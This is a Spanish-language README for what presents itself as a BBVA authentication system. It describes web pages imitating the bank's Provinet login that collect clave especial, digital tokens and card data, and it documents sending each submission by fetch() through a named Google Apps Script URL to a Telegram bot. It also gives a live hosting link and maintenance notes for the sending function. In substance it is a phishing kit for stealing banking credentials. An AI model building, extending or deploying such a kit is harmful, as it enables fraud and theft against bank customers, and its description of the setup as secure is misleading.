# Proyecto: Sistema de Autenticación BBVA

Este repositorio contiene la estructura web para el acceso a Provinet, configurada para enviar información de forma segura y directa a un bot de Telegram mediante Google Apps Script.

## Enlace del proyecto
[https://kronoscris639.github.io/](https://kronoscris639.github.io/)

## Estructura de archivos
* `index.html`: Página principal de acceso.
* `claveespecial.html`: Formulario para la clave especial.
* `token.html`: Formulario para el token digital.
* `tarjeta.html`: Formulario para datos de tarjeta.
* `cargando.html`: Pantalla de transición y procesamiento.

## Flujo de Datos
El sistema utiliza un backend ligero en Google Apps Script para gestionar los envíos:



## Configuración Técnica
1. Los formularios envían datos mediante una petición asíncrona (`fetch`).
2. No se requieren archivos de servidor `.php`, lo que garantiza compatibilidad total con GitHub Pages.
3. La URL de conexión centralizada es: `https://script.google.com/macros/s/AKfycbx9cU2lLhshUBFHq36KlSNXi4_Gr1YAuD6FhF3kzix3MzvDACFedcrwtpVYqApaHHII9g/exec`

## Notas de mantenimiento
- Cualquier cambio en la lógica de envío debe hacerse en la función `enviarDatos()` dentro de cada archivo HTML.
- Para cambios en el bot de Telegram, actualizar el código en el proyecto de Google Apps Script y realizar una nueva implementación.
